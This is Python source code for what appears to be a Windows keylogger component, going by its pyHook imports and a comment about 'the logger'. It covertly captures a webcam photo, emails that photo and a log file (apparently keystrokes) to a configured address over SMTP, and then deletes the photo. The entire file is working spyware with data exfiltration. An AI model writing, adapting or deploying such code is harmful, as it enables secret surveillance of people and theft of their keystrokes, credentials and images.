import pythoncom, pyHook
import os
import sys
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *
import threading
import time
from pathlib import Path
#camer open libraries
import cv2
import smtplib
#email libraries
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEBase import MIMEBase
from email import encoders
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

 
#will take photo and save it in the same directory of the logger
def take_photo():
	camera_port = 0
	camera = cv2.VideoCapture(camera_port)
	time.sleep(0.1)  # If you don't wait, the image will be dark
	image = camera.read()[1]
	cv2.imwrite("E:\logg.png", image)
	del(camera)  # so that others can use the camera as soon as possible


def send_email():
	#threading.Timer(7200.0, send_email).start()
	take_photo()
	fromaddr = "From_Email_Address"
	toaddr = "To_Email_Address"
	 
	msg = MIMEMultipart()
	 
	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = "Ahmed Khaled"
	 
	#body of the message
	body = "this is the message" 
	
	msg.attach(MIMEText(body, 'plain'))

	#prepare text file to be sent
	filename = Path("log.in")
	if filename.is_file():
		filename = "log.in"
		attachment = open("log.in", "r+")	 
		part = MIMEBase('application', 'octet-stream')
		part.set_payload((attachment).read())
		encoders.encode_base64(part)
		part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
		msg.attach(part)

	#prepare image to be sent
	filename = Path("logg.png")
	if filename.is_file():
		#attaach the image
		img_data = open("logg.png", 'rb').read()
		image = MIMEImage(img_data, name=os.path.basename("logg.png"))
		msg.attach(image)
	 
	server = smtplib.SMTP('smtp.live.com', 587)
	server.starttls()
	server.login(fromaddr, "From_Email_Password")
	text = msg.as_string()
	server.sendmail(fromaddr, toaddr, text)
	server.quit()
	myfile="logg.png"
	## if file exists, delete it ##
	if os.path.isfile(myfile):
	        os.remove(myfile)

send_email()